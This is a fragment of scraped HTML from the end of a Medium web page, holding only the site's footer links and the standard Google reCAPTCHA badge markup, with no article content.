class="ws ac ld ju"><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----bb589148e56f---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----bb589148e56f---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/about?autoplay=1&amp;source=post_page-----bb589148e56f---------------------------------------" data-discover="true"><p class="bg b ec ab eb">About</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----bb589148e56f---------------------------------------" data-discover="true"><p class="bg b ec ab eb">Careers</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----bb589148e56f---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----bb589148e56f---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----bb589148e56f---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="wt wu m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----bb589148e56f---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="wt m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----bb589148e56f---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div>





































<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><div title="reCAPTCHA" width="256" height="60" role="presentation" name="a-bf2il0fy8l4i" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp&amp;co=aHR0cHM6Ly9tZWRpdW0uY29tOjQ0Mw..&amp;hl=en&amp;v=vUgXt_KV952_-5BB2jjloYzl&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=440gyl8a0nse" data-original-tag="iframe">

<title>reCAPTCHA</title>

<link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/vUgXt_KV952_-5BB2jjloYzl/styles__ltr.css">


<div id="rc-anchor-alert" class="rc-anchor-alert"></div>

<div class="rc-anchor rc-anchor-invisible rc-anchor-light  rc-anchor-invisible-hover"><div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div><div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div><div class="rc-anchor-normal-footer"><div class="rc-anchor-logo-large" role="presentation"><div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div></div><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Terms</a></div></div><div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank" style="">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank" style="">Terms</a></div></div></div><div style="display: none;" data-original-tag="iframe"></div></div></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><div style="display: none;" data-original-tag="iframe"></div></div></body></html>